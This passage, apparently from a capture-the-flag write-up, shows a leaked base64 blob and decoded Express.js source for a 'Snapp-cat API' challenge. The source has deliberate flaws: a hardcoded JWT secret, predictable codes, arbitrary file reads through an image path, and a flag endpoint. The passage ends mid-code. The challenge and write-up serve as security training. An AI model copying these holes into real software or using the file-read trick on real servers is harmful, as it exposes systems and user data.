HBsaWNhdGlvbi9qc29uCiAqICAgIHBhcmFtZXRlcnM6CiAqICAgICAgLSBpbjogcXVlcnkgCiAqICAgICAgICBuYW1lOiBjb2RlCiAqICAgICAgICBzY2hlbWE6CiAqICAgICAgICAgIHR5cGU6IGludGVnZXIKICogICAgICAgIHJlcXVpcmVkOiB0cnVlCiAqICAgIHJlc3BvbnNlczoKICogICAgICAyMDA6CiAqICAgICAgICBkZXNjcmlwdGlvbjogQWNjb3VudCB2ZXJpZmllZCBzdWNjZXNzZnVsbHkKICogICAgICA0MDA6CiAqICAgICAgICBkZXNjcmlwdGlvbjogQmFkIG9yIG1pc3Npbmcgb3IgaW5jb3JyZWN0IHZlcmlmaWNhdGlvbiBjb2RlCiAqICAgICAgNDAzOgogKiAgICAgICAgZGVzY3JpcHRpb246IFVuYXV0aGVudGljYXRlZAogKi8KYXBwLmdldCgnL2FwaS91c2VyL2VtYWlsLXZlcmlmaWNhdGlvbi1jYWxsYmFjaycsYXV0aENoZWNrLChyZXEscmVzKT0+ewogIGxldCBjb2RlID0gcmVxLnF1ZXJ5LmNvZGUKCiAgaWYodHlwZW9mKGNvZGUpICE9ICdzdHJpbmcnIHx8ICEvXlswLTldKyQvLnRlc3QoY29kZSkpewogICAgcmV0dXJuIHJlcy5zdGF0dXMoNDAwKS5qc29uKHttZXNzYWdlOiAnQmFkIG9yIG1pc3NpbmcgdmVyaWZpY2F0aW9uIGNvZGUnLCBzdWNjZXNzOiBmYWxzZX0pCiAgfQoKICBpZighcmVxLnNlc3MudmVyaWZpY2F0aW9uQ29kZSB8fCByZXEuc2Vzcy52ZXJpZmljYXRpb25Db2RlICE9PSBjb2RlKXsKICAgIHJldHVybiByZXMuc3RhdHVzKDQwMCkuanNvbih7bWVzc2FnZTogJ0luY29ycmVjdCB2ZXJpZmljYXRpb24gY29kZScsIHN1Y2Nlc3M6IGZhbHNlfSkKICB9CgogIHJlcS51c2VyLmlzVmVyaWZpZWQgPSB0cnVlCiAgcmV0dXJuIHJlcy5zdGF0dXMoMjAwKS5qc29uKHtzdWNjZXNzOiB0cnVlfSkKfSkKCmNvbnN0IHZlcmlmaWNhdGlvbkNoZWNrID0gKHJlcSxyZXMsbmV4dCkgPT4gewogIGlmKHJlcS51c2VyLmlzVmVyaWZpZWQpewogICAgcmV0dXJuIG5leHQoKQogIH0KICByZXR1cm4gcmVzLnN0YXR1cyg0MDMpLmpzb24oe21lc3NhZ2U6ICdZb3VyIGFjY291bnQgaXMgbm90IHZlcmlmaWVkIHlldCcsIHN1Y2Nlc3M6IGZhbHNlfSkKfQoKLyoqCiAqIEBzd2FnZ2VyCiAqIC9hcGkvdXNlci97dXNlcklkfToKICogIGdldDoKICogICAgZGVzY3JpcHRpb246IFJldHVybnMgZGV0YWlscyBvZiB0aGUgdXNlci4KICogICAgdGFnczoKICogICAgICAtIHVzZXJzCiAqICAgIHByb2R1Y2VzOgogKiAgICAgIC0gYXBwbGljYXRpb24vanNvbgogKiAgICBwYXJhbWV0ZXJzOgogKiAgICAgIC0gaW46IHBhdGggCiAqICAgICAgICBuYW1lOiB1c2VySWQKICogICAgICAgIHNjaGVtYToKICogICAgICAgICAgdHlwZTogaW50ZWdlcgogKiAgICAgICAgcmVxdWlyZWQ6IHRydWUKICogICAgcmVzcG9uc2VzOgogKiAgICAgIDIwMDoKICogICAgICAgIGRlc2NyaXB0aW9uOiBTdWNjZXNzZnVsIHJlc3BvbnNlCiAqICAgICAgNDAwOgogKiAgICAgICAgZGVzY3JpcHRpb246IEJhZCBvciBtaXNzaW5nIHVzZXJpZAogKiAgICAgIDQwMzoKICogICAgICAgIGRlc2NyaXB0aW9uOiBVbmF1dGhlbnRpY2F0ZWQKICovCgphcHAuZ2V0KCcvYXBpL3VzZXIvOnVzZXJJZChcXGQrKScsYXV0aENoZWNrLHZlcmlmaWNhdGlvbkNoZWNrLChyZXEscmVzKT0+ewogIGxldCB1c2VySWQgPSArcmVxLnBhcmFtcy51c2VySWQKICBpZihpc05hTih1c2VySWQpKXsKICAgIHJldHVybiByZXMuc3RhdHVzKDQwMCkuanNvbih7bWVzc2FnZTogJ0JhZCBvciBtaXNzaW5nIHVzZXJpZCcsIHN1Y2Nlc3M6IGZhbHNlfSkKICB9CgogIGlmKCF1c2Vycy5oYXModXNlcklkKSl7CiAgICByZXR1cm4gcmVzLnN0YXR1cyg0MDQpLmpzb24oe21lc3NhZ2U6ICdVc2VyIGRvZXNuXCd0IGV4aXN0Jywgc3VjY2VzczogZmFsc2V9KQogIH0KCiAgbGV0IHUgPSB1c2Vycy5nZXQodXNlcklkKQogIHJlcy5qc29uKHsKICAgIGRhdGE6IHsKICAgICAgdXNlcm5hbWU6IHUudXNlcm5hbWUsCiAgICAgIHVzZXJJZDogdS51c2VySWQsCiAgICAgIHBob25lTnVtYmVyOiB1LnBob25lTnVtYmVyLAogICAgICBpc1ZlcmlmaWVkOiB1LmlzVmVyaWZpZWQKICAgIH0sCiAgICBzdWNjZXNzOiB0cnVlCiAgfSkKfSkKCmNvbnN0IGlzQWRtaW4gPSAocmVxLHJlcyxuZXh0KT0+ewogIGlmKHJlcS51c2VyLnVzZXJJZCA9PSAxKSByZXR1cm4gbmV4dCgpCiAgcmV0dXJuIHJlcy5zdGF0dXMoNDAzKS5qc29uKHttc2c6ICdPbmx5IGFkbWluICh3aXRoIHVzZXIgaWQgMSkgY2FuIHVzZSB0aGlzIGVuZHBvaW50Jywgc3VjY2VzczogZmFsc2V9KQp9CgovKioKICogQHN3YWdnZXIKICogL2FwaS9jYXQvcmFuZG9tLWNhdC1pbWFnZToKICogIGdldDoKICogICAgZGVzY3JpcHRpb246IFJldHVybnMgdGhlIHBhdGggdG8gYSByYW5kb20gaW1hZ2UgdG8gYmUgdXNlZCBieSAvYXBpL2NhdC9jcmVhdGUKICogICAgdGFnczoKICogICAgICAtIGNhdHMKICogICAgcHJvZHVjZXM6CiAqICAgICAgLSBhcHBsaWNhdGlvbi9qc29uCiAqICAgIGNvbnN1bWVzOgogKiAgICAgIC0gYXBwbGljYXRpb24vanNvbgogKiAgICByZXNwb25zZXM6CiAqICAgICAgMjAwOgogKiAgICAgICAgZGVzY3JpcHRpb246IFN1Y2Nlc3NmdWwgcmVzcG9uc2UKICogICAgICA0MDM6CiAqICAgICAgICBkZXNjcmlwdGlvbjogVW5hdXRoZW50aWNhdGVkCiAqLwphcHAuZ2V0KCcvYXBpL2NhdC9yYW5kb20tY2F0LWltYWdlJyxhdXRoQ2hlY2ssaXNBZG1pbiwocmVxLHJlcyk9PnsKICByZXMuanNvbih7ZGF0YTp7cGF0aDogY2F0SW1hZ2VzW01hdGguZmxvb3IoTWF0aC5yYW5kb20oKSAqIGNhdEltYWdlcy5sZW5ndGgpXX0sIHN1Y2Nlc3M6IHRydWV9KQp9KQoKLyoqCiAqIEBzd2FnZ2VyCiAqIC9hcGkvY2F0L2NyZWF0ZToKICogIHBvc3Q6CiAqICAgIGRlc2NyaXB0aW9uOiBDcmVhdGVzIGEgbmV3IGNhdCBvYmplY3QuIEltYWdlUGF0aCBzaG91bGQgYmUgcmV0cmlldmVkIGZyb20gL2FwaS9jYXQvdXBsb2FkLWltYWdlCiAqICAgIHRhZ3M6CiAqICAgICAgLSBjYXRzCiAqICAgIHByb2R1Y2VzOgogKiAgICAgIC0gYXBwbGljYXRpb24vanNvbgogKiAgICBjb25zdW1lczoKICogICAgICAtIGFwcGxpY2F0aW9uL2pzb24KICogICAgcmVxdWVzdEJvZHk6CiAqICAgICAgcmVxdWlyZWQ6IHRydWUKICogICAgICBjb250ZW50OgogKiAgICAgICAgYXBwbGljYXRpb24vanNvbjoKICogICAgICAgICAgc2NoZW1hOgogKiAgICAgICAgICAgIHR5cGU6IG9iamVjdAogKiAgICAgICAgICAgIHByb3BlcnRpZXM6CiAqICAgICAgICAgICAgICBuYW1lOgogKiAgICAgICAgICAgICAgICB0eXBlOiBzdHJpbmcKICogICAgICAgICAgICAgIGltYWdlUGF0aDoKICogICAgICAgICAgICAgICAgdHlwZTogc3RyaW5nCiAqICAgICAgICAgICAgICBpc0N1dGU6CiAqICAgICAgICAgICAgICAgIHR5cGU6IGJvb2xlYW4KICogICAgICAgICAgICAgIGlzRmx1ZmZ5OgogKiAgICAgICAgICAgICAgICB0eXBlOiBib29sZWFuCiAqICAgIHJlc3BvbnNlczoKICogICAgICAyMDA6CiAqICAgICAgICBkZXNjcmlwdGlvbjogU3VjY2Vzc2Z1bCByZXNwb25zZQogKiAgICAgIDQwMDoKICogICAgICAgIGRlc2NyaXB0aW9uOiBCYWQgcGFyYW1ldGVycwogKiAgICAgIDQwMzoKICogICAgICAgIGRlc2NyaXB0aW9uOiBVbmF1dGhlbnRpY2F0ZWQKICogICAgICA1MDA6CiAqICAgICAgICBkZXNjcmlwdGlvbjogSW50ZXJuYWwgc2VydmVyIGVycm9yCiAqLwphcHAucG9zdCgnL2FwaS9jYXQvY3JlYXRlJyxhdXRoQ2hlY2ssaXNBZG1pbiwocmVxLHJlcyk9PnsKICBsZXQgbmFtZSA9IHJlcS5ib2R5Lm5hbWUKICBsZXQgaW1hZ2VQYXRoID0gcmVxLmJvZHkuaW1hZ2VQYXRoCiAgbGV0IGlzQ3V0ZSA9ICEhcmVxLmJvZHkuaXNDdXRlCiAgbGV0IGlzRmx1ZmZ5ID0gISFyZXEuYm9keS5pc0ZsdWZmeQogIGxldCBjYXRJZCA9IGNyeXB0by5yYW5kb21VVUlEKCkKCiAgaWYodHlwZW9mIG5hbWUgIT0gJ3N0cmluZycgfHwgIS9eW2EtejAtOV17NiwyMH0kLy50ZXN0KG5hbWUpKXsKICAgIHJldHVybiByZXMuc3RhdHVzKDQwMCkuanNvbih7bWVzc2FnZTogJ05hbWUgc2hvdWxkIG1hdGNoIC9eW2EtejAtOV17NiwyMH0kLycsIHN1Y2Nlc3M6IGZhbHNlfSkKICB9CgogIGlmKHR5cGVvZiBpbWFnZVBhdGggIT0gJ3N0cmluZycgfHwgIS9eW2EtejAtOS8uXXs4LDI1Nn0kLy50ZXN0KGltYWdlUGF0aCkpewogICAgcmV0dXJuIHJlcy5zdGF0dXMoNDAwKS5qc29uKHttZXNzYWdlOiAnUGF0aCBzaG91bGQgbWF0Y2ggL15bYS16MC05Ly5dezgsMTI4fSQvJywgc3VjY2VzczogZmFsc2V9KQogIH0KCiAgaWYoL3Byb2N8ZGV2fHN5cy9pLnRlc3QoaW1hZ2VQYXRoKSl7CiAgICByZXR1cm4gcmVzLnN0YXR1cyg0MDMpLmpzb24oe21lc3NhZ2U6ICdQYXRoIHNob3VsZCBub3QgY29uYWluICJwcm9jIiwgImRldiIgYW5kICJzeXMiIGJlY2F1c2UgaXQgbWF5IGNhdXNlIERvUycsIHN1Y2Nlc3M6IGZhbHNlfSkKICB9CgogIGNhdHMuc2V0KGNhdElkLCB7CiAgICBpc0ZsdWZmeSwKICAgIGlzQ3V0ZSwKICAgIGNhdElkLAogICAgaW1hZ2VQYXRoLAogICAgbmFtZQogIH0pCgogIHJlcy5qc29uKHtkYXRhOiB7IGNhdElkIH0sIHN1Y2Nlc3M6IHRydWV9KQp9KQoKLyoqCiAqIEBzd2FnZ2VyCiAqIC9hcGkvY2F0L3tjYXRJZH06CiAqICBnZXQ6CiAqICAgIGRlc2NyaXB0aW9uOiByZXR1cm5zIGRldGFpbHMgb2YgdGhlIGNhdAogKiAgICB0YWdzOgogKiAgICAgIC0gY2F0cwogKiAgICBwcm9kdWNlczoKICogICAgICAtIGFwcGxpY2F0aW9uL2pzb24KICogICAgY29uc3VtZXM6CiAqICAgICAgLSBhcHBsaWNhdGlvbi9qc29uCiAqICAgIHBhcmFtZXRlcnM6CiAqICAgICAgLSBpbjogcGF0aCAKICogICAgICAgIG5hbWU6IGNhdElkCiAqICAgICAgICBzY2hlbWE6CiAqICAgICAgICAgIHR5cGU6IHN0cmluZwogKiAgICAgICAgcmVxdWlyZWQ6IHRydWUKICogICAgcmVzcG9uc2VzOgogKiAgICAgIDIwMDoKICogICAgICAgIGRlc2NyaXB0aW9uOiBTdWNjZXNzZnVsIHJlc3BvbnNlCiAqICAgICAgNDAwOgogKiAgICAgICAgZGVzY3JpcHRpb246IEJhZCBwYXJhbWV0ZXJzCiAqICAgICAgNDAzOgogKiAgICAgICAgZGVzY3JpcHRpb246IFVuYXV0aGVudGljYXRlZAogKiAgICAgIDQwNDoKICogICAgICAgIGRlc2NyaXB0aW9uOiBDb3VsZCBub3QgZmluZCBhIGNhdCB3aXRoIHRoZSBnaXZlbiBJRAogKiAgICAgIDUwMDoKICogICAgICAgIGRlc2NyaXB0aW9uOiBJbnRlcm5hbCBzZXJ2ZXIgZXJyb3IKICovCmFwcC5nZXQoJy9hcGkvY2F0LzpjYXRJZCcsYXV0aENoZWNrLChyZXEscmVzKT0+ewogIGxldCBjYXRpZCA9IHJlcS5wYXJhbXMuY2F0SWQKCiAgaWYoIS9eWzAtOWEtZl17OH0tWzAtOWEtZl17NH0tWzAtOWEtZl17NH0tWzAtOWEtZl17NH0tWzAtOWEtZl17MTJ9JC8udGVzdChjYXRpZCkpewogICAgcmV0dXJuIHJlcy5zdGF0dXMoNDAwKS5qc29uKHttZXNzYWdlOiAnY2F0SWQgc2hvdWxkIG1hdGNoIC9eWzAtOWEtZl17OH0tWzAtOWEtZl17NH0tWzAtOWEtZl17NH0tWzAtOWEtZl17NH0tWzAtOWEtZl17MTJ9JC8nLCBzdWNjZXNzOiBmYWxzZX0pCiAgfQoKICBsZXQgY2F0ID0gY2F0cy5nZXQoY2F0aWQpCiAgaWYoIWNhdCl7CiAgICByZXR1cm4gcmVzLnN0YXR1cyg0MDQpLmpzb24oe21lc3NhZ2U6ICdjYXQgbm90IGZvdW5kJywgc3VjY2VzczogZmFsc2V9KQogIH0KCiAgY2F0ID0gT2JqZWN0LmFzc2lnbih7fSxjYXQpCgogIGZzLnJlYWRGaWxlKGNhdC5pbWFnZVBhdGgsKGVycixyZXN1bHQpID0+IHsKICAgIGlmKGVycil7CiAgICAgIHJldHVybiByZXMuc3RhdHVzKDUwMCkuanNvbih7bWVzc2FnZTogYFNvbWV0aGluZyBiYWQgaGFwcGVuZWQgd2hpbGUgcmVhZGluZyB0aGUgZmlsZS4gRXJyb3IgaW4gL2FwcC9pbmRleC5qczogJHtlcnIuc3RhY2t9YCwgc3VjY2VzczogZmFsc2V9KQogICAgfQogICAgY2F0LmltYWdlID0gcmVzdWx0LnRvU3RyaW5nKCdiYXNlNjQnKQogICAgZGVsZXRlIGNhdC5pbWFnZVBhdGgKICAgIHJldHVybiByZXMuanNvbih7ZGF0YTp7IGNhdCB9LCBzdWNjZXNzOiB0cnVlfSkKICB9KQp9KQoKYXBwLmdldCgnL3NlY3JldHMtOGQ1YTMzMmQ5ZGUzNWY1OTNlNTI1MmM3MGMwZjhkM2UvZmxhZycsYXV0aENoZWNrLChyZXEscmVzKT0+ewogIGlmKHJlcS5zZXNzLmNhblJlYWRTZWNyZXRzKXsKICAgIC8vIEhpbnQ6IGZsYWcgdmFyaWFibGUgY29udGFpbnMgd2hhdCB5b3UgYXJlIGxvb2tpbmcgZm9yLi4uIAogICAgcmV0dXJuIHJlcy50eXBlKCd0ZXh0L3BsYWluJykuc2VuZChgRkxBRzogJHtmbGFnfWApCiAgfSAKICByZXR1cm4gcmVzLnR5cGUoJ3RleHQvcGxhaW4nKS5zZW5kKCc/PycpCn0pCgo7KCgpPT57CiAgcmVnaXN0ZXJlZFVzZXJuYW1lcy5hZGQoJ2FkbWluJykKICB1c2Vycy5zZXQoMSx7CiAgICB1c2VySWQ6IDEsCiAgICB1c2VybmFtZTogJ2FkbWluJywKICAgIHBhc3N3b3JkOiBzaGEyNTYoJ3JhbXota2hlaWxpLXNha2h0LTEzMzcnKSwKICAgIHBob25lTnVtYmVyOiAnKzEzMzczMTMzMzcxNycsCiAgICBpc1ZlcmlmaWVkOiB0cnVlCiAgfSkKICBpZighL1NOQVBQLy50ZXN0KGZsYWcpKXsKICAgIHByb2Nlc3MuZXhpdCgxKTsKICB9CiAgZnMud3JpdGVGaWxlU3luYygnL2ZsYWcudHh0JywnJykKICBhcHAubGlzdGVuKDgwMDAsICgpID0+IGNvbnNvbGUubG9nKCdTZXJ2ZXIgcnVubmluZyBvbiBwb3J0IDgwMDAnKSkKfSkoKQo="
        }
    },
    "success": true
}

```

and if decode image content by based64 , you can get server code:

```js
#!/usr/bin/env node
const express = require("express");
const swaggerUi = require("swagger-ui-express");
const swaggerJsDoc = require("swagger-jsdoc");
const cookieParser = require("cookie-parser");
const fs = require("fs");
const crypto = require("crypto");
const jwt = require("jsonwebtoken");

const app = express();
const users = new Map();
const phonem = new Set();
const cats = new Map();
const sha256 = (data) => crypto.createHash("sha256").update(data).digest("hex");
const jwtSecret =
  "omidvaram-to-ke-ino-mibini-developer-website-bashi-fd29293cdeaf70dc67b420e73a37e172";
const registeredUsernames = new Set();
const registeredPhoneNumbers = new Set();
const catImages = [
  "./cats/3a338da6-9b0f-4c1a-bc35-f700cc4b915e.png",
  "./cats/dfd9967f-216b-4bb6-affc-4c68708964ac.png",
  "./cats/74a7ff43-2d56-4dab-93a0-b07c9cec0db9.png",
];
let flag = fs.readFileSync("/flag.txt");
let uidcnt = 2;

const swaggerOptions = {
  definition: {
    openapi: "3.0.0",
    info: {
      title: "Snapp-cat API",
      version: "1.0.0",
      description: "API Documentation",
    },
  },
  apis: ["./index.js"],
};

const swaggerDocs = swaggerJsDoc(swaggerOptions);
app.use(express.json());
app.use(cookieParser());
app.use("/swagger-ui", (req, res, next) => {
  res.setHeader("Cache-Control", "max-age=60");
  next();
});
app.use("/swagger-ui", swaggerUi.serve, swaggerUi.setup(swaggerDocs));
app.get("/", (req, res) => res.redirect("/swagger-ui"));

/**
 * @swagger
 * /api/user/register:
 *  post:
 *    description: Registers a new user.
 *    tags:
 *      - users
 *    produces:
 *      - application/json
 *    consumes:
 *      - application/json
 *    requestBody:
 *      required: true
 *      content:
 *        application/json:
 *          schema:
 *            type: object
 *            properties:
 *              username:
 *                type: string
 *              password:
 *                type: string
 *              phoneNumber:
 *                type: string
 *              email:
 *                type: string
 *    responses:
 *      200:
 *        description: Successfully registered the user
 *      400:
 *        description: Bad parameters
 */
app.post("/api/user/register", (req, res) => {
  let username = req.body.username;
  let password = req.body.password;
  let phoneNumber = req.body.phoneNumber;
  let email = req.body.email;

  if (
    typeof username != "string" ||
    typeof password != "string" ||
    typeof phoneNumber != "string" ||
    typeof email != "string"
  ) {
    return res.status(400).json({ message: "Bad parameters", success: false });
  }

  if (!/^[a-z0-9]{6,20}$/.test(username)) {
    return res.status(400).json({
      message: "Username should match /^[a-z0-9]{6,20}$/",
      success: false,
    });
  }

  if (!/^[\x20-\x7f]{8,64}$/.test(password)) {
    return res.status(400).json({
      message: "Password should match /^[\\x20-\\x7f]{8,64}$/",
      success: false,
    });
  }

  if (!/^\+[0-9]{12}$/.test(phoneNumber)) {
    return res.status(400).json({
      message: "Phone number should match /^\\+[0-9]{12}$/",
      success: false,
    });
  }

  if (!/^[\w-]+@[\w-]+\.\w+$/.test(email)) {
    return res.status(400).json({
      message: "Email should match /^[\\w-]+@[\\w-]+\\.\\w+$/",
      success: false,
    });
  }

  if (registeredUsernames.has(username)) {
    return res.status(400).json({
      message: "A user with this username already exists",
      success: false,
    });
  }

  if (registeredPhoneNumbers.has(phoneNumber)) {
    return res.status(400).json({
      message: "A user with this phone number already exists",
      success: false,
    });
  }

  password = sha256(password);
  registeredUsernames.add(username);
  registeredPhoneNumbers.add(phoneNumber);

  users.set(uidcnt, {
    userId: uidcnt,
    username,
    password,
    phoneNumber,
    isVerified: false,
  });
  uidcnt += 1;

  res.json({ success: true });
});

/**
 * @swagger
 * /api/user/login:
 *  post:
 *    description: Checks username and password and sets the session cookie.
 *    tags:
 *      - users
 *    produces:
 *      - application/json
 *    consumes:
 *      - application/json
 *    requestBody:
 *      required: true
 *      content:
 *        application/json:
 *          schema:
 *            type: object
 *            properties:
 *              username:
 *                type: string
 *              password:
 *                type: string
 *    responses:
 *      200:
 *        description: Successful login
 *      400:
 *        description: Bad parameters
 *      401:
 *        description: Incorrect username or password
 */
app.post("/api/user/login", (req, res) => {
  let username = req.body.username;
  let password = req.body.password;

  if (typeof username != "string" || typeof password != "string") {
    return res.status(400).json({ message: "Bad parameters", success: false });
  }

  password = sha256(password);

  let userId = null;
  for (let e of users) {
    if (e[1].username === username && e[1].password === password) {
      userId = e[1].userId;
      break;
    }
  }

  if (userId === null) {
    return res
      .status(401)
      .json({ message: "Incorrect username or password", success: false });
  }

  let token = jwt.sign(
    {
      userId,
    },
    jwtSecret
  );
  res.cookie("sess", token, { maxAge: 1000 * 60 * 60, httpOnly: true });

  res.json({ success: true });
});

const authCheck = (req, res, next) => {
  let token = req.cookies.sess;
  if (typeof token == "string") {
    try {
      req.sess = jwt.verify(token, jwtSecret);
      req.user = users.get(req.sess.userId);
      if (req.user) {
        // will uncomment this when in production
        // if(req.user.userId == 1){
        //   req.sess.canReadSecrets = true
        // }
        return next();
      }
    } catch (e) {
      console.log(e);
    }
  }
  return res.json({ message: "Unauthenticated", success: false });
};

/**
 * @swagger
 * /api/user/login-with-phone:
 *  post:
 *    description: sends a 7-digit code to the phoneNumber of user. our server is not connected to SMS service provider yet so user won't receive anything.
 *    tags:
 *      - users
 *    produces:
 *      - application/json
 *    consumes:
 *      - application/json
 *    requestBody:
 *      required: true
 *      content:
 *        application/json:
 *          schema:
 *            type: object
 *            properties:
 *              phoneNumber:
 *                type: string
 *    responses:
 *      200:
 *        description: Successful response
 *      400:
 *        description: Bad parameters
 *      403:
 *        description: Unauthenticated
 *      404:
 *        description: Couldn't find a user with this phone number
 */
app.post("/api/user/login-with-phone", (req, res) => {
  let phoneNumber = req.body.phoneNumber;
  let code = Math.random().toString().slice(-7);

  if (typeof phoneNumber != "string" || !/^\+[0-9]{12}$/.test(phoneNumber)) {
    return res.status(400).json({
      message: "Phone number should match /^\\+[0-9]{12}$/",
      success: false,
    });
  }

  let userId = null;
  for (let e of users) {
    if (e[1].phoneNumber === phoneNumber) {
      userId = e[1].userId;
      break;
    }
  }

  if (userId == null) {
    return res.status(404).json({
      message: "Couldn't find a user with this phone number",
      success: false,
    });
  }

  phonem.add({
    phoneNumber,
    userId,
    code,
  });

  res.json({
    code: { sha256: sha256(code) },
    message:
      "Saved the code in the database but couldn't send the code because the server is not connected to SMS service provider yet",
    sucess: true,
  });
});

/**
 * @swagger
 * /api/user/login-with-phone-callback:
 *  post:
 *    description: checks the 7-digit code that was sent to the user via /api/user/login-with-phone and sets the session cookie
 *    tags:
 *      - users
 *    produces:
 *      - application/json
 *    consumes:
 *      - application/json
 *    requestBody:
 *      required: true
 *      content:
 *        application/json:
 *          schema:
 *            type: object
 *            properties:
 *              phoneNumber:
 *                type: string
 *              code:
 *                type: string
 *    responses:
 *      200:
 *        description: Successful response
 *      400:
 *        description: Bad parameters
 *      403:
 *        description: Unauthenticated
 *      401:
 *        description: Phone number or code is incorrect
 */
app.post("/api/user/login-with-phone-callback", (req, res) => {
  let phoneNumber = req.body.phoneNumber;
  let code = req.body.code;

  if (typeof phoneNumber != "string" || !/^\+[0-9]{12}$/.test(phoneNumber)) {
    return res.status(400).json({
      message: "Phone number should match /^\\+[0-9]{12}$/",
      success: false,
    });
  }

  if (!/^[0-9]{7}$/.test(code)) {
    return res.status(400).json({
      message: "Phone number should match /^\\+[0-9]{12}$/",
      success: false,
    });
  }

  code = code.toString();
  phoneNumber = phoneNumber.toString();

  let userId = null;
  for (let p of phonem) {
    if (p.phoneNumber === phoneNumber && p.code == code) {
      userId = p.userId;
      delete p.phoneNumber;
      break;
    }
  }

  if (userId === null) {
    return res
      .status(401)
      .json({ message: "Phone number or code is incorrect", success: false });
  }
  let token = jwt.sign(
    {
      userId,
    },
    jwtSecret
  );
  res.cookie("sess", token, { maxAge: 1000 * 60 * 60, httpOnly: true });

  res.json({ sucess: true });
});

/**
 * @swagger
 * /api/user/self-id:
 *  get:
 *    description: Returns user id of the logged in user.
 *    tags:
 *      - users
 *    produces:
 *      - application/json
 *    responses:
 *      200:
 *        description: Successful response
 *      403:
 *        description: Unauthenticated
 */
app.get("/api/user/self-id", authCheck, (req, res) => {
  res.json({
    data: {
      userId: req.user.userId,
    },
    success: true,
  });
});

/**
 * @swagger
 * /api/user/send-verification-email:
 *  post:
 *    description: Sends an email to the user containing a 10-digit code. Since we are in beta stage, this endpoint is not yet connected to any SMTP server so currently we can't send emails.
 *    tags:
 *      - users
 *    produces:
 *      - application/json
 *    responses:
 *      200:
 *        description: Successful response
 *      403:
 *        description: Unauthenticated
 */
app.post("/api/user/send-verification-email", authCheck, (req, res) => {
  let token = jwt.sign(
    {
      userId: req.user.userId,
      verificationCode: Math.random().toString().slice(-10),
    },
    jwtSecret
  );
  res.cookie("sess", token, { maxAge: 1000 * 60 * 60, httpOnly: true });

  res.json({
    message:
      "Generated and saved the code in session but could'nt send the email because email processing is disabled",
    success: true,
  });
});

/**
 * @swagger
 * /api/user/email-verification-callback:
 *  get:
 *    description: Email verification callback.
 *    tags:
 *      - users
 *    produces:
 *      - application/json
 *    parameters:
 *      - in: query
 *        name: code
 *        schema:
 *          type: integer
 *        required: true
 *    responses:
 *      200:
 *        description: Account verified successfully
 *      400:
 *        description: Bad or missing or incorrect verification code
 *      403:
 *        description: Unauthenticated
 */
app.get("/api/user/email-verification-callback", authCheck, (req, res) => {
  let code = req.query.code;

  if (typeof code != "string" || !/^[0-9]+$/.test(code)) {
    return res
      .status(400)
      .json({ message: "Bad or missing verification code", success: false });
  }

  if (!req.sess.verificationCode || req.sess.verificationCode !== code) {
    return res
      .status(400)
      .json({ message: "Incorrect verification code", success: false });
  }

  req.user.isVerified = true;
  return res.status(200).json({ success: true });
});

const verificationCheck = (req, res, next) => {
  if (req.user.isVerified) {
    return next();
  }
  return res
    .status(403)
    .json({ message: "Your account is not verified yet", success: false });
};

/**
 * @swagger
 * /api/user/{userId}:
 *  get:
 *    description: Returns details of the user.
 *    tags:
 *      - users
 *    produces:
 *      - application/json
 *    parameters:
 *      - in: path
 *        name: userId
 *        schema:
 *          type: integer
 *        required: true
 *    responses:
 *      200:
 *        description: Successful response
 *      400:
 *        description: Bad or missing userid
 *      403:
 *        description: Unauthenticated
 */

app.get("/api/user/:userId(\\d+)", authCheck, verificationCheck, (req, res) => {
  let userId = +req.params.userId;
  if (isNaN(userId)) {
    return res
      .status(400)
      .json({ message: "Bad or missing userid", success: false });
  }

  if (!users.has(userId)) {
    return res
      .status(404)
      .json({ message: "User doesn't exist", success: false });
  }

  let u = users.get(userId);
  res.json({
    data: {
      username: u.username,
      userId: u.userId,
      phoneNumber: u.phoneNumber,
      isVerified: u.isVerified,
    },
    success: true,
  });
});

const isAdmin = (req, res, next) => {
  if (req.user.userId == 1) return next();
  return res.status(403).json({
    msg: "Only admin (with user id 1) can use this endpoint",
    success: false,
  });
};

/**
 * @swagger
 * /api/cat/random-cat-image:
 *  get:
 *    description: Returns the path to a random image to be used by /api/cat/create
 *    tags:
 *      - cats
 *    produces:
 *      - application/json
 *    consumes:
 *      - application/json
 *    responses:
 *      200:
 *        description: Successful response
 *      403:
 *        description: Unauthenticated
 */
app.get("/api/cat/random-cat-image", authCheck, isAdmin, (req, res) => {
  res.json({
    data: { path: catImages[Math.floor(Math.random() * catImages.length)] },
    success: true,
  });
});

/**
 * @swagger
 * /api/cat/create:
 *  post:
 *    description: Creates a new cat object. ImagePath should be retrieved from /api/cat/upload-image
 *    tags:
 *      - cats
 *    produces:
 *      - application/json
 *    consumes:
 *      - application/json
 *    requestBody:
 *      required: true
 *      content:
 *        application/json:
 *          schema:
 *            type: object
 *            properties:
 *              name:
 *                type: string
 *              imagePath:
 *                type: string
 *              isCute:
 *                type: boolean
 *              isFluffy:
 *                type: boolean
 *    responses:
 *      200:
 *        description: Successful response
 *      400:
 *        description: Bad parameters
 *      403:
 *        description: Unauthenticated
 *      500:
 *        description: Internal server error
 */
app.post("/api/cat/create", authCheck, isAdmin, (req, res) => {
  let name = req.body.name;
  let imagePath = req.body.imagePath;
  let isCute = !!req.body.isCute;
  let isFluffy = !!req.body.isFluffy;
  let catId = crypto.randomUUID();

  if (typeof name != "string" || !/^[a-z0-9]{6,20}$/.test(name)) {
    return res.status(400).json({
      message: "Name should match /^[a-z0-9]{6,20}$/",
      success: false,
    });
  }

  if (typeof imagePath != "string" || !/^[a-z0-9/.]{8,256}$/.test(imagePath)) {
    return res.status(400).json({
      message: "Path should match /^[a-z0-9/.]{8,128}$/",
      success: false,
    });
  }

  if (/proc|dev|sys/i.test(imagePath)) {
    return res.status(403).json({
      message:
        'Path should not conain "proc", "dev" and "sys" because it may cause DoS',
      success: false,
    });
  }

  cats.set(catId, {
    isFluffy,
    isCute,
    catId,
    imagePath,
    name,
  });

  res.json({ data: { catId }, success: true });
});

/**
 * @swagger
 * /api/cat/{catId}:
 *  get:
 *    description: returns details of the cat
 *    tags:
 *      - cats
 *    produces:
 *      - application/json
 *    consumes:
 *      - application/json
 *    parameters:
 *      - in: path
 *        name: catId
 *        schema:
 *          type: string
 *        required: true
 *    responses:
 *      200:
 *        description: Successful response
 *      400:
 *        description: Bad parameters
 *      403:
 *        description: Unauthenticated
 *      404:
 *        description: Could not find a cat with the given ID
 *      500:
 *        description: Internal server error
 */
app.get("/api/cat/:catId", authCheck, (req, res) => {
  let catid = req.params.catId;

  if (
    !/^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/.test(
      catid
    )
  ) {
    return res.status(400).json({
      message:
